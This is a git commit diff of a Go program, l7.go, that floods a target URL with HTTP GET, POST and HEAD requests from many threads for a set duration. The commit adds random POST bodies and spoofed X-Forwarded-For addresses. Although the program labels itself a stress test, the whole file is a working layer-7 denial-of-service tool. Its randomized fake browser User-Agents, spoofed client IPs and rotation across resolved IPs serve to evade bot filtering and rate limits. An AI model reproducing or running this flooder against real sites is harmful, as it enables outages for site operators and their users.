04c94fd8413bdf7c31f7ab52c48c9f73ad48ba38
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2025-05-20 23:07:35 +0800

    Update l7.go

--- l7.go
+++ l7.go
@@ -1,243 +1,292 @@
 package main
 
 import (
-	"crypto/tls"
-	"fmt"
-	"math/rand"
-	"net"
-	"net/url"
-	"os"
-	"strconv"
-	"sync"
-	"time"
+    "crypto/tls"
+    "fmt"
+    "math/rand"
+    "net"
+    "net/url"
+    "os"
+    "strconv"
+    "strings"
+    "sync"
+    "time"
 )
 
 var (
-	ip            string
-	ips           []string // List of resolved IPs for DNS Randomization
-	port          int
-	path          string
-	threads       int
-	timer         int
-	customHost    string
-	httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
+    ip            string
+    ips           []string // List of resolved IPs for DNS Randomization
+    port          int
+    path          string
+    threads       int
+    timer         int
+    customHost    string
+    httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
 )
 
 func init() {
-	rand.Seed(time.Now().UnixNano())
+    rand.Seed(time.Now().UnixNano())
+}
+
+func randomString(length int) string {
+    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    result := make([]byte, length)
+    for i := range result {
+        result[i] = letters[rand.Intn(len(letters))]
+    }
+    return string(result)
 }
 
 func resolveDNS(hostname string) {
-	addrs, err := net.LookupIP(hostname)
-	if err != nil {
-		fmt.Println("Failed to resolve DNS:", err)
-		os.Exit(1)
-	}
+    addrs, err := net.LookupIP(hostname)
+    if err != nil {
+        fmt.Println("Failed to resolve DNS:", err)
+        os.Exit(1)
+    }
 
-	for _, addr := range addrs {
-		if ipv4 := addr.To4(); ipv4 != nil {
-			ips = append(ips, ipv4.String())
-		}
-	}
+    for _, addr := range addrs {
+        if ipv4 := addr.To4(); ipv4 != nil {
+            ips = append(ips, ipv4.String())
+        }
+    }
 
-	if len(ips) == 0 {
-		fmt.Println("No valid IP addresses resolved!")
-		os.Exit(1)
-	}
+    if len(ips) == 0 {
+        fmt.Println("No valid IP addresses resolved!")
+        os.Exit(1)
+    }
 
-	fmt.Printf("Resolved IPs: %v\n", ips)
+    fmt.Printf("Resolved IPs: %v\n", ips)
 }
 
 func getUserAgent() string {
-	browserVersions := map[string]string{
-		"Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
-		"Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
-		"Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
-		"Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
-	}
+    browserVersions := map[string]string{
+        "Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
+        "Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
+        "Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
+        "Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
+    }
 
-	osInfo := map[string]string{
-		"Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
-		"Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
-		"Linux":     "X11; Linux x86_64",
-		"Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
-		"iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
-		"iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
-	}
+    osInfo := map[string]string{
+        "Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
+        "Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
+        "Linux":     "X11; Linux x86_64",
+        "Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
+        "iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
+        "iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
+    }
 
-	devices := []struct {
-		typeName string
-		models   []string
-	}{
-		{"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
-		{"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
-		{"Desktop", []string{"", "", "", ""}}, // Empty for desktop
-	}
+    devices := []struct {
+        typeName string
+        models   []string
+    }{
+        {"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
+        {"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
+        {"Desktop", []string{"", "", "", ""}}, // Empty for desktop
+    }
 
-	// Select random device type
-	deviceType := devices[rand.Intn(len(devices))]
-	model := ""
-	if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
-		model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
-	}
+    // Select random device type
+    deviceType := devices[rand.Intn(len(devices))]
+    model := ""
+    if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
+        model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
+    }
 
-	// Select random OS
-	var osKeys []string
-	for k := range osInfo {
-		osKeys = append(osKeys, k)
-	}
-	selectedOS := osKeys[rand.Intn(len(osKeys))]
+    // Select random OS
+    var osKeys []string
+    for k := range osInfo {
+        osKeys = append(osKeys, k)
+    }
+    selectedOS := osKeys[rand.Intn(len(osKeys))]
 
-	// Select random browser
-	var browserKeys []string
-	for k := range browserVersions {
-		browserKeys = append(browserKeys, k)
-	}
-	selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]
+    // Select random browser
+    var browserKeys []string
+    for k := range browserVersions {
+        browserKeys = append(browserKeys, k)
+    }
+    selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]
 
-	return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
-		model,
-		osInfo[selectedOS],
-		func() string {
-			if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
-				return " Mobile"
-			}
-			return ""
-		}(),
-		selectedBrowser,
-		browserVersions[selectedBrowser],
-	)
+    return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
+        model,
+        osInfo[selectedOS],
+        func() string {
+            if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
+                return " Mobile"
+            }
+            return ""
+        }(),
+        selectedBrowser,
+        browserVersions[selectedBrowser],
+    )
 }
 
-func getHeader(method string) string {
-	hostHeader := ip
-	if customHost != "" {
-		hostHeader = customHost
-	}
+func getHeader(method string) (string, []byte) {
+    hostHeader := ip
+    if customHost != "" {
+        hostHeader = customHost
+    }
 
-	languages := []string{
-		"en-US,en;q=0.9",
-		"en-GB,en;q=0.8",
-		"fr-FR,fr;q=0.9",
-	}
+    languages := []string{
+        "en-US,en;q=0.9",
+        "en-GB,en;q=0.8",
+        "fr-FR,fr;q=0.9",
+    }
 
-	header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
-	header += fmt.Sprintf("Host: %s\r\n", hostHeader)
-	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
-	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-	header += "Accept-Encoding: gzip, deflate\r\n"
-	header += fmt.Sprintf("Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
-	header += "Connection: keep-alive\r\n"
-	header += "Cache-Control: no-cache\r\n"
-	header += fmt.Sprintf("Referer: https://%s\r\n", hostHeader)
-	header += "Upgrade-Insecure-Requests: 1\r\n"
+    header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
+    header += fmt.Sprintf("Host: %s\r\n", hostHeader)
+    header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
+    header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+    header += "Accept-Encoding: gzip, deflate, br\r\n"
+    header += fmt.Sprintf("Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
+	header += fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+    header += "Connection: keep-alive\r\n"
+    header += "Cache-Control: no-cache\r\n"
+    header += fmt.Sprintf("Referer: https://%s\r\n", hostHeader)
 
-	if method == "POST" {
-		header += "Content-Length: 0\r\n"
-	}
+    var body []byte
 
-	header += "\r\n"
-	return header
+    if method == "POST" {
+        contentTypes := []string{
+            "application/x-www-form-urlencoded",
+            "application/json",
+            "text/plain",
+        }
+        contentType := contentTypes[rand.Intn(len(contentTypes))]
+        header += fmt.Sprintf("Content-Type: %s\r\n", contentType)
+
+        switch contentType {
+        case "application/x-www-form-urlencoded":
+            data := url.Values{}
+            for i := 0; i < 3; i++ {
+                key := randomString(5)
+                value := randomString(10)
+                data.Set(key, value)
+            }
+            body = []byte(data.Encode())
+        case "application/json":
+            var parts []string
+            for i := 0; i < 3; i++ {
+                key := randomString(5)
+                val := randomString(10)
+                parts = append(parts, fmt.Sprintf("\"%s\":\"%s\"", key, val))
+            }
+            body = []byte("{" + strings.Join(parts, ",") + "}")
+        case "text/plain":
+            body = []byte("plain_text_" + randomString(10))
+        }
+
+        header += fmt.Sprintf("Content-Length: %d\r\n", len(body))
+    }
+
+    header += "\r\n"
+
+    return header, body
 }
 
 func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
-	defer wg.Done()
+    defer wg.Done()
 
-	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
-	for count := range requestCount {
-		for {
-			randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
-			address := fmt.Sprintf("%s:%d", randomIP, port)
+    tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
+    for count := range requestCount {
+        for {
+            randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
+            address := fmt.Sprintf("%s:%d", randomIP, port)
 
-			var conn net.Conn
-			var err error
-			if port == 443 {
-				conn, err = tls.Dial("tcp", address, tlsConfig)
-			} else {
-				conn, err = net.Dial("tcp", address)
-			}
+            var conn net.Conn
+            var err error
+            if port == 443 {
+                conn, err = tls.Dial("tcp", address, tlsConfig)
+            } else {
+                conn, err = net.Dial("tcp", address)
+            }
 
-			if err != nil {
-				fmt.Printf("Worker %d: connection error: %v\n", id, err)
-				time.Sleep(time.Second)
-				continue
-			}
+            if err != nil {
+                fmt.Printf("Worker %d: connection error: %v\n", id, err)
+                time.Sleep(time.Second)
+                continue
+            }
 
-			for i := 0; i < count; i++ {
-				method := httpMethods[rand.Intn(len(httpMethods))] // Random HTTP method
-				header := getHeader(method)
-				_, err := conn.Write([]byte(header))
-				if err != nil {
-					fmt.Printf("Worker %d: write error: %v\n", id, err)
-					break
-				}
-			}
-			conn.Close()
-			break
-		}
-	}
+            for i := 0; i < count; i++ {
+                method := httpMethods[rand.Intn(len(httpMethods))]
+                header, body := getHeader(method)
+                _, err := conn.Write([]byte(header))
+                if err != nil {
+                    fmt.Printf("Worker %d: write error: %v\n", id, err)
+                    break
+                }
+                if method == "POST" {
+                    _, err = conn.Write(body)
+                    if err != nil {
+                        fmt.Printf("Worker %d: write error: %v\n", id, err)
+                        break
+                    }
+                }
+            }
+            conn.Close()
+            break
+        }
+    }
 }
 
 func main() {
-	if len(os.Args) < 4 {
-		fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
-		return
-	}
+    if len(os.Args) < 4 {
+        fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
+        return
+    }
 
-	parsedURL, err := url.Parse(os.Args[1])
-	if err != nil {
-		fmt.Println("Invalid URL:", err)
-		return
-	}
+    parsedURL, err := url.Parse(os.Args[1])
+    if err != nil {
+        fmt.Println("Invalid URL:", err)
+        return
+    }
 
-	ip = parsedURL.Hostname()
-	if parsedURL.Port() != "" {
-		port, _ = strconv.Atoi(parsedURL.Port())
-	} else if parsedURL.Scheme == "https" {
-		port = 443
-	} else {
-		port = 80
-	}
+    ip = parsedURL.Hostname()
+    if parsedURL.Port() != "" {
+        port, _ = strconv.Atoi(parsedURL.Port())
+    } else if parsedURL.Scheme == "https" {
+        port = 443
+    } else {
+        port = 80
+    }
 
-	path = parsedURL.Path
-	if path == "" {
-		path = "/"
-	}
+    path = parsedURL.Path
+    if path == "" {
+        path = "/"
+    }
 
-	threads, _ = strconv.Atoi(os.Args[2])
-	timer, _ = strconv.Atoi(os.Args[3])
-	if len(os.Args) > 4 {
-		customHost = os.Args[4]
-	}
+    threads, _ = strconv.Atoi(os.Args[2])
+    timer, _ = strconv.Atoi(os.Args[3])
+    if len(os.Args) > 4 {
+        customHost = os.Args[4]
+    }
 
-	resolveDNS(ip)
+    resolveDNS(ip)
 
-	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
-	if customHost != "" {
-		fmt.Printf("Using custom Host header: %s\n", customHost)
-	}
+    fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
+    if customHost != "" {
+        fmt.Printf("Using custom Host header: %s\n", customHost)
+    }
 
-	var wg sync.WaitGroup
-	requestCount := make(chan int, threads)
+    var wg sync.WaitGroup
+    requestCount := make(chan int, threads)
 
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go worker(i, &wg, requestCount)
-	}
+    for i := 0; i < threads; i++ {
+        wg.Add(1)
+        go worker(i, &wg, requestCount)
+    }
 
-	go func() {
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
+    go func() {
+        ticker := time.NewTicker(1 * time.Second)
+        defer ticker.Stop()
 
-		for t := 0; t < timer; t++ {
-			<-ticker.C
-			for i := 0; i < threads; i++ {
-				requestCount <- 200
-			}
-		}
-		close(requestCount)
-	}()
+        for t := 0; t < timer; t++ {
+            <-ticker.C
+            for i := 0; i < threads; i++ {
+                requestCount <- 200
+            }
+        }
+        close(requestCount)
+    }()
 
-	wg.Wait()
-	fmt.Println("Stress test completed.")
+    wg.Wait()
+    fmt.Println("Stress test completed.")
 }
